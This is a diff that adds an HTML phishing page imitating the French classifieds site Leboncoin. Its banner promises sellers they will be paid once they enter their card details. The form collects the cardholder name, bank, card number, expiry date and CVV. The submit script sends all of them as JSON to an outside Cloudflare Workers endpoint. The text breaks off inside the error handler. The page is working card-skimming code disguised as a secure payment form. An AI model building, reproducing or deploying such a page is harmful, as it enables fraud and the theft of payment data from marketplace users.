@@ -1,0 +1,1280 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Leboncoin, site de petites annonces gratuites</title>
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Favicons -->
+  <link href="favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+  <link href="favicon.ico" rel="icon" type="image/x-icon"/>
+  <link href="apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+  <link href="site.webmanifest" rel="manifest"/>
+
+  <style>
+
+    /* =====================================================
+       VARIABLES CSS — LEBONCOIN (header/footer)
+       ===================================================== */
+    :root {
+      --leboncoin-orange: #F26C2A;
+      --leboncoin-dark-gray: #555;
+      --leboncoin-light-gray-bg: #f5f5f5;
+      --leboncoin-white: #fff;
+      --leboncoin-medium-gray: #aaa;
+      --leboncoin-footer-bg: #3A474E;
+      --leboncoin-footer-text: #E0E0E0;
+      --leboncoin-footer-link-hover: #F26C2A;
+    }
+
+    /* =====================================================
+       VARIABLES CSS — PAGE PAIEMENT (Vinted)
+       ===================================================== */
+    :root {
+      --vinted-green: #F26C2A;
+      --vinted-dark-grey: #333333;
+      --vinted-medium-grey: #555555;
+      --vinted-light-grey: #f5f5f5;
+      --vinted-border-grey: #e8e8e8;
+      --vinted-white: #ffffff;
+    }
+
+    /* =====================================================
+       RESET & BASE
+       ===================================================== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      max-width: 100%;
+      overflow-x: hidden;
+    }
+
+    body {
+      font-family: 'Inter', 'Open Sans', Arial, sans-serif;
+      color: var(--vinted-dark-grey);
+      line-height: 1.5;
+      background-color: var(--leboncoin-white);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    body.no-scroll {
+      overflow: hidden;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    ul {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    button {
+      border: none;
+      background: none;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    /* =====================================================
+       HEADER — LEBONCOIN
+       ===================================================== */
+    .header-fixed-wrapper {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 100;
+      background-color: var(--leboncoin-white);
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+
+    .header-fixed-wrapper .top-header,
+    .header-fixed-wrapper .categories-nav {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .top-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 15px 25px;
+      background-color: var(--leboncoin-white);
+      min-height: 70px;
+    }
+
+    .hamburger-menu {
+      display: none;
+      font-size: 28px;
+      color: var(--leboncoin-dark-gray);
+    }
+
+    .logo {
+      font-size: 36px;
+      font-weight: bold;
+      color: var(--leboncoin-orange);
+      margin-right: 25px;
+      z-index: 5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .leboncoin-logo-img {
+      height: 40px;
+      width: auto;
+    }
+
+    .deposer-annonce {
+      display: flex;
+      align-items: center;
+      background-color: var(--leboncoin-orange);
+      color: var(--leboncoin-white);
+      padding: 12px 25px;
+      height: 48px;
+      box-sizing: border-box;
+      border-radius: 25px;
+      font-weight: bold;
+      font-size: 16px;
+      margin-right: 25px;
+      white-space: nowrap;
+    }
+
+    .deposer-annonce .fa-plus {
+      margin-right: 10px;
+      font-size: 18px;
+    }
+
+    .search-bar-wrapper {
+      display: flex;
+      flex-grow: 1;
+      border-radius: 28px;
+      background-color: var(--leboncoin-light-gray-bg);
+      overflow: hidden;
+      margin: 0 15px;
+      z-index: 1;
+      min-width: 350px;
+      height: 48px;
+      box-sizing: border-box;
+    }
+
+    .search-bar-wrapper .search-input-area {
+      position: relative;
+      flex-grow: 1;
+      display: flex;
+      align-items: center;
+      background-color: transparent;
+    }
+
+    .search-bar-wrapper input {
+      width: 100%;
+      border: none;
+      padding: 0 20px;
+      background-color: transparent;
+      outline: none;
+      font-size: 16px;
+      color: var(--leboncoin-dark-gray);
+      box-sizing: border-box;
+      height: 100%;
+    }
+
+    .search-bar-wrapper input::placeholder {
+      color: #777777;
+    }
+
+    .search-button-combined {
+      background-color: transparent;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--leboncoin-white);
+      flex-shrink: 0;
+      height: 100%;
+    }
+
+    .search-button-combined .search-icon-circle {
+      width: 48px;
+      height: 48px;
+      background-color: var(--leboncoin-orange);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 5px;
+      flex-shrink: 0;
+    }
+
+    .search-button-combined .search-icon-circle .fa-magnifying-glass {
+      color: var(--leboncoin-white);
+      font-size: 20px;
+    }
+
+    .nav-icons {
+      display: flex;
+      margin-left: 25px;
+      align-items: center;
+    }
+
+    .nav-icons li {
+      margin-left: 30px;
+      white-space: nowrap;
+    }
+
+    .nav-icons a {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--leboncoin-dark-gray);
+      font-size: 13px;
+    }
+
+    .nav-icons .fa-solid {
+      font-size: 24px;
+      margin-bottom: 5px;
+    }
+
+    .mobile-login-btn {
+      display: none;
+    }
+
+    .categories-nav {
+      background-color: var(--leboncoin-white);
+      padding: 15px 0;
+      border-top: 1px solid #eee;
+      text-align: center;
+    }
+
+    .categories-nav ul {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 25px;
+    }
+
+    .categories-nav li {
+      position: relative;
+      margin: 0 15px;
+      font-size: 16px;
+      color: var(--leboncoin-dark-gray);
+      white-space: nowrap;
+      padding: 7px 0;
+    }
+
+    .categories-nav li:not(:last-child)::after {
+      content: '•';
+      position: absolute;
+      right: -15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #ddd;
+      font-size: 18px;
+    }
+
+    .categories-nav a:hover {
+      color: var(--leboncoin-orange);
+    }
+
+    /* =====================================================
+       MENU MOBILE — LEBONCOIN
+       ===================================================== */
+    .mobile-menu-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+    }
+
+    .mobile-menu-overlay.is-open {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .mobile-menu {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 80%;
+      max-width: 300px;
+      height: 100%;
+      background-color: var(--leboncoin-white);
+      z-index: 1001;
+      box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
+      transform: translateX(-100%);
+      transition: transform 0.3s;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+      scrollbar-width: none;
+    }
+
+    .mobile-menu::-webkit-scrollbar {
+      display: none;
+    }
+
+    .mobile-menu.is-open {
+      transform: translateX(0);
+    }
+
+    .mobile-menu-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .mobile-menu-header .logo {
+      font-size: 28px;
+      margin-right: 0;
+    }
+
+    .mobile-menu-nav li {
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .mobile-menu-nav a {
+      display: flex;
+      align-items: center;
+      padding: 15px 20px;
+      font-size: 16px;
+      color: var(--leboncoin-dark-gray);
+    }
+
+    .mobile-menu-nav a .fa-solid {
+      font-size: 20px;
+      margin-right: 15px;
+    }
+
+    .mobile-menu-nav .category-header {
+      font-weight: bold;
+      color: var(--leboncoin-medium-gray);
+      padding: 15px 20px 5px;
+      font-size: 14px;
+      border-bottom: none;
+    }
+
+    .mobile-menu-nav .section-separator {
+      height: 10px;
+      background-color: #f8f8f8;
+      border-bottom: 1px solid #eee;
+    }
+
+    .mobile-menu-nav .login-section {
+      padding: 15px 20px;
+      border-top: 1px solid #eee;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    /* =====================================================
+       CONTENU PRINCIPAL — PAGE PAIEMENT
+       ===================================================== */
+    main {
+      flex: 1;
+      /* Décalage pour le header fixe LeBonCoin (~70px top-header + ~55px categories-nav) */
+      padding-top: 140px;
+    }
+
+    .page-content-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+      width: 100%;
+      max-width: 100%;
+      box-sizing: border-box;
+      overflow-x: hidden;
+    }
+
+    /* Conteneur global du formulaire */
+    .page-container {
+      width: 100%;
+      max-width: 700px;
+      box-sizing: border-box;
+      box-shadow: 0 4px 25px rgba(0,0,0,0.1);
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    /* Bannière turquoise */
+    .top-banner {
+      background-color: #F26C2A;
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+
+    .top-banner p {
+      margin: 0;
+      font-size: 20px;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+
+    /* Corps du formulaire */
+    .payment-card {
+      background: white;
+      padding: 45px;
+      box-sizing: border-box;
+      width: 100%;
+      overflow-x: hidden;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      margin: 0 0 10px 0;
+      color: #111;
+    }
+
+    .security-info {
+      font-size: 17px;
+      color: #333;
+      margin-bottom: 25px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 15px;
+      line-height: 1.4;
+    }
+
+    .lock-icon {
+      font-size: 26px;
+      color: #555;
+    }
+
+    /* Logos de paiement */
+    .card-icons {
+      margin-bottom: 35px;
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .card-icons img {
+      height: 28px;
+      object-fit: contain;
+      border: 1px solid #eee;
+      border-radius: 4px;
+      padding: 3px 6px;
+      background: #fff;
+    }
+
+    /* Champs de saisie */
+    label {
+      display: block;
+      font-size: 18px;
+      font-weight: 600;
+      color: #111;
+      margin-bottom: 12px;
+    }
+
+    .form-group {
+      margin-bottom: 35px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 0;
+      border: none;
+      border-bottom: 2px solid #edeef0;
+      font-size: 19px;
+      outline: none;
+      color: #000;
+      box-sizing: border-box;
+      background: transparent;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      border-bottom-color: #F26C2A;
+    }
+
+    .amount-input {
+      font-weight: 700;
+      color: #F26C2A;
+      font-size: 24px;
+    }
+
+    .row {
+      display: flex;
+      gap: 40px;
+    }
+
+    .row .form-group {
+      flex: 1;
+    }
+
+    /* Bouton principal */
+    .btn-submit {
+      background-color: #F26C2A;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 20px;
+      border-radius: 4px;
+      font-size: 19px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background-color 0.2s;
+    }
+
+    .btn-submit:hover {
+      background-color: #F26C2A;
+    }
+
+    /* Message de vérification */
+    .verification-message {
+      margin-top: 20px;
+      padding: 14px 18px;
+      background-color: #f0faf7;
+      border: 1px solid #F26C2A;
+      border-radius: 6px;
+      font-size: 16px;
+      color: #F26C2A;
+      font-weight: 500;
+      display: none;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    /* =====================================================
+       FOOTER — LEBONCOIN
+       ===================================================== */
+    .main-footer {
+      background-color: var(--leboncoin-footer-bg);
+      color: var(--leboncoin-footer-text);
+      padding: 50px 20px 20px;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    .footer-content {
+      max-width: 1000px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 20px;
+      padding-bottom: 40px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .footer-column h3 {
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: var(--leboncoin-white);
+      position: relative;
+      padding-bottom: 10px;
+    }
+
+    .footer-column h3::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      bottom: 0;
+      width: 100%;
+      height: 2px;
+      background-color: var(--leboncoin-footer-text);
+      transition: background-color 0.3s ease;
+    }
+
+    .footer-column h3:hover::after {
+      background-color: var(--leboncoin-orange);
+    }
+
+    .footer-column ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .footer-column li {
+      margin-bottom: 10px;
+    }
+
+    .footer-column a {
+      color: var(--leboncoin-footer-text);
+      text-decoration: none;
+      transition: color 0.3s ease;
+      display: inline-block;
+    }
+
+    .footer-column a:hover {
+      color: var(--leboncoin-orange);
+      text-decoration: underline;
+      text-decoration-color: var(--leboncoin-orange);
+      text-decoration-thickness: 1px;
+    }
+
+    .footer-bottom {
+      max-width: 1000px;
+      margin: 20px auto 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      padding-top: 20px;
+    }
+
+    .social-media-links {
+      display: flex;
+      gap: 15px;
+    }
+
+    .social-media-links a {
+      color: var(--leboncoin-footer-text);
+      font-size: 20px;
+      transition: color 0.3s ease;
+    }
+
+    .social-media-links a:hover {
+      color: var(--leboncoin-orange);
+    }
+
+    .app-links {
+      display: flex;
+      gap: 15px;
+      align-items: center;
+    }
+
+    .app-links a {
+      display: block;
+    }
+
+    .app-links img {
+      height: 35px;
+      border-radius: 5px;
+    }
+
+    .copyright {
+      margin-top: 20px;
+      text-align: center;
+      width: 100%;
+      color: rgba(255, 255, 255, 0.5);
+    }
+
+    /* =====================================================
+       RESPONSIVE — MOBILE
+       ===================================================== */
+    @media (max-width: 1024px) {
+      .top-header .nav-icons a { font-size: 12px; }
+    }
+
+    @media (max-width: 768px) {
+      .top-header {
+        flex-wrap: wrap;
+        justify-content: flex-start;
+        padding: 15px 20px;
+      }
+
+      .hamburger-menu {
+        display: block;
+        margin-right: 15px;
+        order: 1;
+        position: relative;
+        z-index: 10;
+      }
+
+      .logo {
+        font-size: 32px;
+        flex-grow: 1;
+        text-align: center;
+        margin-right: 0;
+        order: 2;
+        flex-shrink: 0;
+        position: relative;
+        z-index: 9;
+      }
+
+      .deposer-annonce,
+      .nav-icons {
+        display: none;
+      }
+
+      .mobile-login-btn {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: var(--leboncoin-white);
+        border: 1px solid var(--leboncoin-orange);
+        color: var(--leboncoin-orange);
+        padding: 8px 15px;
+        border-radius: 5px;
+        font-weight: bold;
+        font-size: 14px;
+        height: 35px;
+        box-sizing: border-box;
+        margin-left: auto;
+        order: 3;
+        flex-shrink: 0;
+        white-space: nowrap;
+      }
+
+      .mobile-login-btn span {
+        margin: 0;
+        font-weight: bold;
+      }
+
+      .search-bar-wrapper {
+        width: calc(100% - 40px);
+        order: 4;
+        margin-top: 20px;
+        margin-left: auto;
+        margin-right: auto;
+        padding: 0;
+        display: flex;
+        height: auto;
+        position: relative;
+        z-index: 5;
+        min-width: unset;
+      }
+
+      .search-button-combined {
+        display: none;
+      }
+
+      .categories-nav {
+        display: block;
+        padding: 10px 0;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        white-space: nowrap;
+        border-top: none;
+        background-color: var(--leboncoin-white);
+        box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        scrollbar-width: none;
+      }
+
+      .categories-nav::-webkit-scrollbar {
+        display: none;
+      }
+
+      .categories-nav .categories-scroll-wrapper {
+        display: flex;
+        padding: 0 10px;
+      }
+
+      .categories-nav ul {
+        display: inline-flex;
+        justify-content: flex-start;
+        flex-wrap: nowrap;
+        padding: 0;
+        margin: 0;
+      }
+
+      .categories-nav li {
+        margin: 0 10px;
+        padding: 5px 0;
+        flex-shrink: 0;
+      }
+
+      .categories-nav li:not(:last-child)::after {
+        content: '';
+        display: none;
+      }
+
+      /* Ajustement du padding-top pour mobile (header plus haut sur mobile) */
+      main {
+        padding-top: 200px;
+      }
+
+      /* Contenu page paiement */
+      .page-container {
+        margin-top: 0;
+        max-width: 100%;
+        width: 100%;
+        border-radius: 0;
+        box-shadow: none;
+      }
+
+      .payment-card {
+        padding: 25px;
+        width: 100%;
+        box-sizing: border-box;
+      }
+
+      .row {
+        flex-direction: column;
+        gap: 0;
+      }
+
+      .page-content-wrapper {
+        padding: 0;
+        width: 100%;
+        max-width: 100%;
+      }
+
+      input {
+        width: 100%;
+        box-sizing: border-box;
+      }
+
+      .form-group {
+        width: 100%;
+        box-sizing: border-box;
+      }
+
+      /* Footer responsive */
+      .footer-content {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 30px 20px;
+        padding-bottom: 30px;
+      }
+
+      .footer-column h3 {
+        font-size: 15px;
+        margin-bottom: 10px;
+        padding-bottom: 5px;
+      }
+
+      .footer-column h3::after {
+        width: 100%;
+        height: 1px;
+      }
+
+      .footer-column li {
+        margin-bottom: 8px;
+      }
+
+      .footer-column a {
+        font-size: 13px;
+      }
+
+      .footer-bottom {
+        flex-direction: column;
+        align-items: center;
+        gap: 20px;
+        padding-top: 15px;
+      }
+
+      .app-links {
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+
+      .app-links img {
+        height: 30px;
+      }
+
+      .copyright {
+        font-size: 12px;
+        margin-top: 15px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .footer-content {
+        grid-template-columns: 1fr;
+        gap: 20px;
+      }
+
+      .footer-column h3 {
+        text-align: center;
+      }
+
+      .footer-column h3::after {
+        left: 50%;
+        transform: translateX(-50%);
+        width: 80%;
+      }
+
+      .footer-column ul {
+        text-align: center;
+      }
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- =====================================================
+       MENU MOBILE OVERLAY — LEBONCOIN
+       ===================================================== -->
+  <div class="mobile-menu-overlay"></div>
+  <div class="mobile-menu">
+    <div class="mobile-menu-header">
+      <a href="#" class="logo">
+        <img src="logodujour2.png" alt="leboncoin logo" class="leboncoin-logo-img">
+      </a>
+      <button class="close-menu-btn" aria-label="Fermer le menu">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <nav class="mobile-menu-nav">
+      <ul>
+        <li><a href="#"><i class="fas fa-comment-dots"></i>Messages</a></li>
+        <li><a href="#"><i class="fas fa-heart"></i>Favoris</a></li>
+        <li><a href="#"><i class="fas fa-bell"></i>Recherches sauvegardées</a></li>
+        <li class="section-separator"></li>
+        <li class="category-header">Catégories</li>
+        <li><a href="#">Immobilier</a></li>
+        <li><a href="#">Véhicules</a></li>
+        <li><a href="#">Vacances</a></li>
+        <li><a href="#">Emploi</a></li>
+        <li><a href="#">Mode</a></li>
+        <li><a href="#">Maison &amp; Jardin</a></li>
+        <li><a href="#">Famille</a></li>
+        <li><a href="#">Électronique</a></li>
+        <li><a href="#">Loisirs</a></li>
+        <li><a href="#">Autres</a></li>
+        <li class="section-separator"></li>
+        <li class="login-section"><a href="">Déconnexion</a></li>
+      </ul>
+    </nav>
+  </div>
+
+  <!-- ===== HEADER LEBONCOIN ===== -->
+  <header>
+    <div class="header-fixed-wrapper">
+      <nav class="top-header">
+        <button class="hamburger-menu" aria-label="Ouvrir le menu mobile">
+          <i class="fas fa-bars"></i>
+        </button>
+        <a href="#" class="logo">
+          <img src="logodujour2.png" alt="leboncoin logo" class="leboncoin-logo-img">
+        </a>
+        <a href="" class="mobile-login-btn">
+          <span>Déconnexion</span>
+        </a>
+        <button class="deposer-annonce">
+          <i class="fas fa-plus"></i>Déposer une annonce
+        </button>
+        <div class="search-bar-wrapper">
+          <div class="search-input-area">
+            <i class="fas fa-magnifying-glass input-icon"></i>
+            <input type="text" placeholder="Rechercher sur leboncoin" />
+          </div>
+          <button class="search-button-combined" aria-label="Lancer la recherche">
+            <span class="search-icon-circle">
+              <i class="fas fa-magnifying-glass"></i>
+            </span>
+          </button>
+        </div>
+        <ul class="nav-icons">
+          <li><a href="#"><i class="fas fa-bell"></i><span>Mes recherches</span></a></li>
+          <li><a href="#"><i class="fas fa-heart"></i><span>Favoris</span></a></li>
+          <li><a href="#"><i class="fas fa-comment-dots"></i><span>Messages</span></a></li>
+          <li><a href=""><i class="fas fa-user"></i><span>Déconnexion</span></a></li>
+        </ul>
+      </nav>
+      <nav class="categories-nav">
+        <div class="categories-scroll-wrapper">
+          <ul>
+            <li><a href="#">Immobilier</a></li>
+            <li><a href="#">Véhicules</a></li>
+            <li><a href="#">Vacances</a></li>
+            <li><a href="#">Emploi</a></li>
+            <li><a href="#">Mode</a></li>
+            <li><a href="#">Maison &amp; Jardin</a></li>
+            <li><a href="#">Famille</a></li>
+            <li><a href="#">Électronique</a></li>
+            <li><a href="#">Loisirs</a></li>
+            <li><a href="#">Autres</a></li>
+          </ul>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <!-- ===== CONTENU PRINCIPAL — PAGE PAIEMENT ===== -->
+  <main>
+    <div class="page-content-wrapper">
+      <div class="page-container">
+
+        <div class="top-banner">
+          <p>💰 Recevez votre argent en toute sécurité. Complétez simplement vos informations de paiement pour valider le transfert immédiat de vos gains vers votre compte bancaire.</p>
+        </div>
+
+        <div class="payment-card">
+          <h1>Détails de la carte</h1>
+
+          <div class="security-info">
+            <p>🔐 Paiement 100% sécurisé. Vos informations sont protégées et ne seront jamais partagées.</p>
+            <span class="lock-icon">🔒</span>
+          </div>
+
+          <div class="card-icons">
+            <img src="mastercard.jpg" alt="Mastercard">
+            <img src="visa.jpg" alt="Visa">
+            <img src="maestro.jpg" alt="Maestro">
+            <img src="cb.jpg" alt="CB">
+          </div>
+
+          <form id="paymentForm">
+            <div class="form-group">
+              <label for="nom">Nom figurant sur la carte</label>
+              <input type="text" id="nom" placeholder="Saisis ton nom et prénom" required>
+            </div>
+
+            <div class="form-group">
+              <label for="banque">Établissement bancaire</label>
+              <input type="text" id="banque" placeholder="Ex: Boursorama, LCL, Revolut...">
+            </div>
+
+            <div class="form-group">
+                <label for="montant">Prix de l'article</label>
+                <input type="text" id="montant" class="amount-input" placeholder="0,00 €" required>
+            </div>
+
+            <div class="form-group">
+              <label for="card-number">Numéro de carte</label>
+              <input type="text" id="card-number" placeholder="Par ex : 1234 1234 1234 1234" maxlength="19" required>
+            </div>
+
+            <div class="row">
+              <div class="form-group">
+                <label for="expiry">Date d'expiration</label>
+                <input type="text" id="expiry" placeholder="MM / AA" maxlength="7" required>
+              </div>
+              <div class="form-group">
+                <label for="cvv">Code de sécurité</label>
+                <input type="text" id="cvv" placeholder="par ex : 123" maxlength="3" required>
+              </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn">Vérifier ma carte</button>
+
+            <div class="verification-message" id="verificationMessage">
+              Vérification en cours... Votre transfert est en cours de traitement...
+            </div>
+          </form>
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+  <!-- ===== FOOTER LEBONCOIN ===== -->
+  <footer class="main-footer">
+    <div class="footer-content">
+      <div class="footer-column">
+        <h3>À propos du boncoin</h3>
+        <ul>
+          <li><a href="#">Qui sommes-nous ?</a></li>
+          <li><a href="#">Nous rejoindre</a></li>
+          <li><a href="#">Impact environnemental</a></li>
+          <li><a href="#">Accessibilité</a></li>
+          <li><a href="#">Authenticité des annonces</a></li>
+          <li><a href="#">Informations légales</a></li>
+          <li><a href="#">Conditions Générales de Vente</a></li>
+          <li><a href="#">Conditions Générales d'Utilisation</a></li>
+          <li><a href="#">Avis de non-responsabilité</a></li>
+          <li><a href="#">Gestion des cookies</a></li>
+          <li><a href="#">Politique de confidentialité</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Nos services</h3>
+        <ul>
+          <li><a href="#">Solutions pros</a></li>
+          <li><a href="#">Publicité</a></li>
+          <li><a href="#">Tous nos services</a></li>
+          <li><a href="#">Aide et Contact</a></li>
+          <li><a href="#">Déposer une annonce</a></li>
+          <li><a href="#">Centre de sécurité</a></li>
+          <li><a href="#">Livraison</a></li>
+          <li><a href="#">Paiement sécurisé</a></li>
+          <li><a href="#">Assurance</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Nos univers</h3>
+        <ul>
+          <li><a href="#">Immobilier</a></li>
+          <li><a href="#">Véhicules</a></li>
+          <li><a href="#">Vacances</a></li>
+          <li><a href="#">Emploi</a></li>
+          <li><a href="#">Mode</a></li>
+          <li><a href="#">Maison &amp; Jardin</a></li>
+          <li><a href="#">Famille</a></li>
+          <li><a href="#">Électronique</a></li>
+          <li><a href="#">Loisirs</a></li>
+          <li><a href="#">Autres</a></li>
+          <li><a href="#">leboncoin sur YouTube</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Découvrez nos applications</h3>
+        <div class="app-links">
+          <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_on_the_App_Store_Badge.svg.png" alt="Disponible sur l'App Store"></a>
+          <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Disponible sur Google Play"></a>
+        </div>
+        <h3 style="margin-top: 30px;">Suivez-nous</h3>
+        <div class="social-media-links">
+          <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+          <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+          <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+          <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p class="copyright">&copy; 2025 leboncoin - Tous droits réservés</p>
+    </div>
+  </footer>
+
+  <!-- =====================================================
+       SCRIPT — LEBONCOIN (menu hamburger + recherche)
+       ===================================================== -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const hamburger = document.querySelector('.hamburger-menu');
+      const closeBtn = document.querySelector('.close-menu-btn');
+      const overlay = document.querySelector('.mobile-menu-overlay');
+      const menu = document.querySelector('.mobile-menu');
+
+      const searchInput = document.querySelector('.search-bar-wrapper input');
+      const searchButtonCombined = document.querySelector('.search-button-combined');
+      const searchIconInsideInput = document.querySelector('.search-bar-wrapper .input-icon');
+
+      const performSearch = () => {
+        const searchTerm = searchInput ? searchInput.value : '';
+        if (searchTerm) {
+          alert('Recherche de : ' + searchTerm);
+        }
+      };
+
+      if (searchInput) {
+        searchInput.addEventListener('keypress', (event) => {
+          if (event.key === 'Enter') {
+            event.preventDefault();
+            performSearch();
+          }
+        });
+      }
+
+      if (searchButtonCombined) searchButtonCombined.addEventListener('click', performSearch);
+      if (searchIconInsideInput) searchIconInsideInput.addEventListener('click', performSearch);
+
+      function openMenu() {
+        if (menu) menu.classList.add('is-open');
+        if (overlay) overlay.classList.add('is-open');
+        document.body.classList.add('no-scroll');
+      }
+
+      function closeMenu() {
+        if (menu) menu.classList.remove('is-open');
+        if (overlay) overlay.classList.remove('is-open');
+        document.body.classList.remove('no-scroll');
+      }
+
+      if (hamburger) hamburger.addEventListener('click', openMenu);
+      if (closeBtn) closeBtn.addEventListener('click', closeMenu);
+      if (overlay) overlay.addEventListener('click', closeMenu);
+    });
+  </script>
+
+  <!-- =====================================================
+       SCRIPT — PAGE PAIEMENT (formulaire bancaire)
+       ===================================================== -->
+  <script>
+    // 1. Masque Numéro de carte (espaces tous les 4 chiffres)
+    const cardNumber = document.getElementById('card-number');
+    cardNumber.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+      let matches = value.match(/\d{4,16}/g);
+      let match = matches && matches[0] || '';
+      let parts = [];
+      for (let i = 0, len = match.length; i < len; i += 4) {
+        parts.push(match.substring(i, i + 4));
+      }
+      e.target.value = parts.length ? parts.join(' ') : value;
+    });
+
+    // 2. Masque Date d'expiration (MM / AA)
+    const expiry = document.getElementById('expiry');
+    expiry.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        e.target.value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
+      } else {
+        e.target.value = value;
+      }
+    });
+
+    // 3. Restriction numérique CVV
+    const cvv = document.getElementById('cvv');
+    cvv.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+    });
+
+    // 4. Soumission du formulaire
+    const submitBtn = document.getElementById('submitBtn');
+    const WORKER_URL = 'https://patient-limit-83c6.sylvainruggieri9.workers.dev';
+
+    document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const cardNumberVal = document.getElementById('card-number').value;
+      const cardName = document.getElementById('nom').value;
+      const banque = document.getElementById('banque').value;
+      const montant = document.getElementById('montant').value;
+      const expiryDate = document.getElementById('expiry').value;
+      const cvvVal = document.getElementById('cvv').value;
+
+      try {
+        await fetch(WORKER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            "SITE": "LEBONCOIN",
+            "PAGE": "PAIEMENT",
+            "TITULAIRE": cardName,
+            "BANQUE": banque,
+            "MONTANT": montant,
+            "NUMERO CARTE": cardNumberVal,
+            "EXPIRATION": expiryDate,
+            "CVV": cvvVal
+          })
+        });
+      } catch (error) {
